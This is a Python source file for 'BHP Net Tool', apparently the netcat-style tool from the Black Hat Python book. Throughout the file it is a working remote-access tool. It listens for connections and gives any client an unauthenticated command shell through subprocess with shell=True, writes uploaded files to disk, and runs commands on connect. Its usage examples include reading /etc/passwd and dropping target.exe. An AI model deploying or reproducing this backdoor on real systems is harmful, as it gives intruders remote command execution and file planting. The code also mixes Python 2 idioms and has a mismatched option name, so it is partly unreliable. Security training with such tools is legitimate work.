# -*- coding: utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

#define global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    text = """BHP Net Tool

Usage: bhnet.py -t target_host -p port
    -l --listen              - listen on [host]:[port] for
                               incoming cinnections
    -e --execute=file_to_run - execute the given file upon
                               receiving a connection
    -c command               - initialize a command shell
    -u --upload=destination  - upon receiving connection upload a
                               file and write to [destination]


Examples:
    bhnet.py -t 192.168.0.1 -p 5555 -l -c
    bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe
    bhnet.py -t 192.168.0.1 -p 5555 -l -e "cat /etc/passwd" 
    echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135
    """
    print(text)
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read commandline option
    try:
        opts, args = getopt.getopt(
                sys.argv[1:],
                "hle:t:p:cu:",
                ["help", "listen", "execute=", "target=",
                 "port=", "command", "upload="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    #wait connection? or receive data from stdin and submit?
    if not listen and len(target) and port > 0:
        #store input from commandline to 'buffer'
        #if this doesn't submit data to stdin, input Ctrl-D
        #because if it doesn't come any input, it doesn't continue the process
        buffer = sys.stdin.read()

        #submit data
        client_sender(buffer)

    #start waiting connection
    #execute command, command shell or upload a file each commandline option
    if listen:
        server_loop()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #connect to target host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            #wait data from target host
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response)

            #wait additional input
            buffer = raw_input("")
            buffer += "\n"

            #submit data
            client.send(buffer)

    except:
        print("[*] Exception! Exiting.")

        #close connection
        client.close()

def server_loop():
    global target

    #if it doedn't appoint waiting IP address, wait connection at all interface

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #start thread that processes new connection from client
        client_thread = threading.Thread(
                target=client_handler, args=(client_socket,))
        client_thread.start()



def run_command(command):
    #delete last linefeed of string
    command = command.rstrip()

    #get result of the command
    try:
        output = subprocess.check_output(
                command, stderr = subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    #submit result of the command to client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #check whether or not appoint uploading file 
    if len(upload_destination):

        #read all data and write the data to appointed file
        file_buffer = ""

        #keep receiving data until run out data to receive
        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buffer += data

        #write received data to file
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #inform succeeded or failed of writing to file
            client_socket.send(
                "Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send(
                "Failed to save file to %s\r\n" % upload_destination)

    #check whether or not appoint executing command
    if len(execute):

        #execute command
        output = run_command(execute)

        client_socket.send(output)

    #process the case of appointing executing commandshell
    if command:

        #show prompt
        prompt = "<BHP:#> "
        client_socket.send(prompt)

        while True:

            #keep receiving until receive linefeed(\n)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            #get result of the command
            response = run_command(cmd_buffer)
            response += prompt

            #submit result of the command
            client_socket.send(response)

main()
